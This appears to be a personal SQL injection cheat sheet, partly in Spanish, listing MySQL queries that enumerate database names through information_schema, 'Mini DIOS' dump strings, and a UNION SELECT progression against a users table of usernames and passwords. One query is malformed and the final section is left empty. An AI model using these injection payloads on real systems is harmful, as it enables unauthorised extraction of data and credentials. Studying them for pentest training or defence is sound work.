# SQLi: schema, schemata & DIOS

## Fz3r0 SQLi: `schema_name` (Databases) mini bible

````sql
## Schema Name AKA Databases Names Dump
SELECT schema_name FROM information_schema.schemata;

---

## Group Concat Basic Query
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;

## Limitando a 1 en caso que solo deje arrojar un resultado
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata limit 0,1;

---

## Concat Basic Query
SELECT CONCAT(schema_name) FROM information_schema.schemata;

## Mini DIOS: DB Enum (schema enum)
SELECT CONCAT('Database PWNed : ',(schema_name)) FROM information_schema.schemata;

---
````

## `schema name` from `information schema`

### Query basic

````sql
## Schema Name AKA Databases Names Dump
select schema_name CONCAT information_schema.schemata;
````

---

### Group Concat

#### Basic

````sql
## Group Concat Basic Query
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;

## Limitando a 1 en caso que solo deje arrojar un resultado
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata limit 0,1;
````

#### Variantes

````sql
## Agregando un string para separador en forma de ':'
SELECT GROUP_CONCAT(schema_name SEPARATOR ' : ') FROM information_schema.schemata;

## Mini DIOS
SELECT GROUP_CONCAT('Database PWNed: ',schema_name) FROM information_schema.schemata;
````

---

### Concat

#### Basic

````sql
## Concat Basic Query
SELECT concat(schema_name) FROM information_schema.schemata;
````

#### Variantes

````sql
## Agregando un string para separador en forma de ':'
SELECT concat(schema_name, ' : ') FROM information_schema.schemata;

## Mini DIOS: DB Enum (schema enum)
SELECT concat('Database PWNed : ',(schema_name)) FROM information_schema.schemata;
````

---

### Union + Group Concat

#### Union Select Progression:

````sql
## Original example v1:
select username,password from users;

## Original example v2:
select username,password from users where username = 'F0n3';

## Basic Union Select (v1)
select username,password from users union select 1,2;

## Condition Union Select (v2):
select username,password from users where username = 'F0n3' union select 1,2;

## Condition Union Select, strings a palcer (v2):
select username,password from users where username = 'F0n3' union select 'izquierda','derecha';
````

---

#### Union Select Progression:

````sql
````
